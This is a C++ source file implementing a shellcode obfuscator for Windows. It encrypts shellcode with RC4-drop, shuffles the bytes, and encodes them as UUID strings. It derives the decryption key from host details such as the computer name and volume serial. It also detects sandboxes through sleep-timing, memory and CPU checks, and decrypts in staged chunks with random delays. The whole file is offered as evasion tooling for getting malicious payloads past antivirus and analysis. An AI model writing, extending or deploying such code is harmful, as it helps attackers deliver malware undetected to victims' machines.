#include "obfuscator.h"
#include <cstring>
#include <ctime>
#include <random>
#include <numeric>

void ShellcodeObfuscator::RC4(const uint8_t* key, size_t keyLen,
                               const uint8_t* input, uint8_t* output, size_t dataLen) {
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;

    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + S[i] + key[i % keyLen];
        std::swap(S[i], S[j]);
    }

    // RC4-drop: discard first 3072 bytes of keystream
    uint8_t a = 0, b = 0;
    for (int i = 0; i < 3072; i++) {
        a++; b += S[a]; std::swap(S[a], S[b]);
    }

    for (size_t k = 0; k < dataLen; k++) {
        a++; b += S[a]; std::swap(S[a], S[b]);
        output[k] = input[k] ^ S[(S[a] + S[b]) & 0xFF];
    }
}

static uint32_t lcg_state;
static void     lcg_seed(uint32_t s) { lcg_state = s; }
static uint32_t lcg_next() { lcg_state = lcg_state * 1664525u + 1013904223u; return lcg_state; }

void ShellcodeObfuscator::PermuteBytes(uint8_t* data, size_t len, uint32_t seed) {
    lcg_seed(seed);
    for (size_t i = len - 1; i > 0; i--)
        std::swap(data[i], data[lcg_next() % (i + 1)]);
}

void ShellcodeObfuscator::UnpermuteBytes(uint8_t* data, size_t len, uint32_t seed) {
    lcg_seed(seed);
    std::vector<std::pair<size_t, size_t>> swaps;
    for (size_t i = len - 1; i > 0; i--)
        swaps.push_back({i, lcg_next() % (i + 1)});
    for (auto it = swaps.rbegin(); it != swaps.rend(); ++it)
        std::swap(data[it->first], data[it->second]);
}

std::vector<std::string> ShellcodeObfuscator::EncodeAsUUIDs(const uint8_t* data, size_t len) {
    std::vector<std::string> uuids;
    size_t padded = ((len + 15) / 16) * 16;
    std::vector<uint8_t> buf(data, data + len);
    std::mt19937 rng((uint32_t)len ^ 0xDEADBEEF);
    while (buf.size() < padded) buf.push_back((uint8_t)(rng() & 0xFF));

    for (size_t i = 0; i < padded; i += 16) {
        char uuid[64];
        snprintf(uuid, sizeof(uuid),
                 "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
                 buf[i+3], buf[i+2], buf[i+1], buf[i+0], buf[i+5], buf[i+4],
                 buf[i+7], buf[i+6], buf[i+8], buf[i+9],
                 buf[i+10], buf[i+11], buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
        uuids.push_back(uuid);
    }
    return uuids;
}

std::vector<uint8_t> ShellcodeObfuscator::DecodeFromUUIDs(const std::vector<std::string>& uuids) {
    std::vector<uint8_t> result;
    for (auto& uuid : uuids) {
        std::string hex;
        for (char c : uuid) if (c != '-') hex += c;
        if (hex.size() != 32) continue;

        uint8_t bytes[16];
        for (int i = 0; i < 16; i++)
            bytes[i] = (uint8_t)strtoul(hex.substr(i * 2, 2).c_str(), nullptr, 16);

        // UUID endianness reversal
        uint8_t ordered[] = {bytes[3],bytes[2],bytes[1],bytes[0], bytes[5],bytes[4],
                             bytes[7],bytes[6], bytes[8],bytes[9],bytes[10],bytes[11],
                             bytes[12],bytes[13],bytes[14],bytes[15]};
        result.insert(result.end(), ordered, ordered + 16);
    }
    return result;
}

uint32_t ShellcodeObfuscator::FNV1a(const uint8_t* data, size_t len) {
    uint32_t hash = 0x811C9DC5;
    for (size_t i = 0; i < len; i++) { hash ^= data[i]; hash *= 0x01000193; }
    return hash;
}

std::vector<uint8_t> ShellcodeObfuscator::DeriveRuntimeKey(const char* salt) {
    std::vector<uint8_t> entropy;

    char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD compLen = sizeof(compName);
    GetComputerNameA(compName, &compLen);
    for (DWORD i = 0; i < compLen; i++) entropy.push_back((uint8_t)compName[i]);

    DWORD volSerial = 0;
    GetVolumeInformationA("C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
    for (int s = 24; s >= 0; s -= 8) entropy.push_back((uint8_t)(volSerial >> s));

    char winDir[MAX_PATH] = {};
    GetWindowsDirectoryA(winDir, MAX_PATH);
    for (size_t i = 0; winDir[i]; i++) entropy.push_back((uint8_t)winDir[i]);

    for (size_t i = 0; salt[i]; i++) entropy.push_back((uint8_t)salt[i]);

    std::vector<uint8_t> key(32);
    uint32_t h = FNV1a(entropy.data(), entropy.size());
    for (int i = 0; i < 32; i++) {
        uint8_t extra[5] = {(uint8_t)i, (uint8_t)(h>>24), (uint8_t)(h>>16), (uint8_t)(h>>8), (uint8_t)h};
        h = FNV1a(extra, 5);
        key[i] = (uint8_t)(h & 0xFF);
    }
    return key;
}

std::vector<uint8_t> ShellcodeObfuscator::Encrypt(const uint8_t* sc, size_t len,
                                                    const uint8_t* key, size_t keyLen,
                                                    uint32_t permSeed) {
    std::vector<uint8_t> buf(len);
    RC4(key, keyLen, sc, buf.data(), len);
    PermuteBytes(buf.data(), buf.size(), permSeed);
    return buf;
}

std::vector<uint8_t> ShellcodeObfuscator::Decrypt(const uint8_t* enc, size_t len, uint32_t permSeed) {
    std::vector<uint8_t> buf(enc, enc + len);
    UnpermuteBytes(buf.data(), buf.size(), permSeed);
    auto key = DeriveRuntimeKey();
    std::vector<uint8_t> out(len);
    RC4(key.data(), key.size(), buf.data(), out.data(), len);
    return out;
}

bool ShellcodeObfuscator::DetectSandbox() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(500);
    QueryPerformanceCounter(&end);
    if ((double)(end.QuadPart - start.QuadPart) / freq.QuadPart < 0.4) return true;

    MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true;

    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    return false;
}

std::vector<uint8_t> ShellcodeObfuscator::StagedDecrypt(const uint8_t* enc, size_t len,
                                                          uint32_t permSeed, size_t chunkSize) {
    std::vector<uint8_t> buf(enc, enc + len);
    UnpermuteBytes(buf.data(), buf.size(), permSeed);

    auto key = DeriveRuntimeKey();
    std::vector<uint8_t> out(len);

    // Manual RC4 state for chunked decryption
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = (uint8_t)i;
    uint8_t j = 0;
    for (int i = 0; i < 256; i++) { j = j + S[i] + key[i % key.size()]; std::swap(S[i], S[j]); }
    uint8_t a = 0, b = 0;
    for (int i = 0; i < 3072; i++) { a++; b += S[a]; std::swap(S[a], S[b]); }

    std::mt19937 rng((uint32_t)GetTickCount());
    size_t off = 0;
    while (off < len) {
        size_t chunk = (std::min)(chunkSize, len - off);
        for (size_t k = 0; k < chunk; k++) {
            a++; b += S[a]; std::swap(S[a], S[b]);
            out[off + k] = buf[off + k] ^ S[(S[a] + S[b]) & 0xFF];
        }
        off += chunk;
        if (off < len) Sleep(rng() % 6);
    }
    return out;
}
